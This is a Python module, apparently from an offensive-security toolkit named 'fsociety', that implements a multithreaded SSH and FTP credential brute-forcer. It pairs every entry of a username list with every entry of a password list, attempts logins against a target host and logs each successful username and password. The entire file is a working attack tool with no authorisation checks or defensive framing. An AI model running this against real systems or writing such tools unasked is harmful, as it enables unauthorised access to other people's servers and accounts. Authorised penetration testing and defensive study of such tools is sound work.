from __future__ import annotations

import ftplib
import paramiko
import socket
from concurrent.futures import ThreadPoolExecutor, as_completed

from fsociety.core.base import tool
from fsociety.core.logger import Log
from fsociety.core.utils import load_lines

@tool("creds", "SSH / FTP credential brute-forcer", category="credential")
class Creds:
    @staticmethod
    def build_parser(p):
        p.add_argument("host")
        p.add_argument("-u", "--userlist", required=True)
        p.add_argument("-p", "--passlist", required=True)
        p.add_argument("--port", type=int, default=22)
        p.add_argument("--proto", default="ssh", choices=["ssh", "ftp"])
        p.add_argument("-t", "--threads", type=int, default=10)

    @staticmethod
    def _try_ssh(host, port, user, pw) -> bool:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(host, port=port, username=user, password=pw, timeout=3, allow_agent=False, look_for_keys=False)
            return True
        except Exception:
            return False
        finally:
            client.close()

    @staticmethod
    def _try_ftp(host, port, user, pw) -> bool:
        try:
            ftp = ftplib.FTP()
            ftp.connect(host, port, timeout=3)
            ftp.login(user, pw)
            ftp.quit()
            return True
        except Exception:
            return False

    @staticmethod
    def run(args, log: Log) -> int:
        users = load_lines(args.userlist)
        pwds = load_lines(args.passlist)
        combos = [(u, p) for u in users for p in pwds]
        
        def attempt(c):
            u, p = c
            ok = Creds._try_ssh(args.host, args.port, u, p) if args.proto == "ssh" else Creds._try_ftp(args.host, args.port, u, p)
            return (u, p, ok)

        hits = []
        with ThreadPoolExecutor(max_workers=args.threads) as ex:
            futures = [ex.submit(attempt, c) for c in combos]
            for f in as_completed(futures):
                u, p, ok = f.result()
                if ok:
                    log.hit(f"{args.proto.upper()} auth success: {u}:{p}")
                    hits.append((u, p))

        return 0 if hits else 1
